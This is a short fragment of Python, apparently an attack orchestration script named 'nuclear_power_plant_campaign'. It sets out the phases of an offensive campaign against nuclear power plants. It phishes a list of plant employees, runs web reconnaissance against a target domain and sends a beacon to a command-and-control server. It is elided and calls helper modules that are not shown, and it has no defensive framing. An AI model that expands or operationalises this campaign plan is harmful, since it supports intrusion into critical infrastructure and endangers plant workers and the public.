...
def main():
    """
    Main function to run the nuclear_power_plant_campaign campaign.
    """
    print(f"[*] Starting nuclear_power_plant_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("nuclear_power_plants_employees.txt")
    run_tool("apt_web_recon.js", "--target nuclear_power_plants.com")
    ...
    command_control.send_beacon(c2_server, "VICTIM-NUCLEAR_POWER_PLANTS-01")
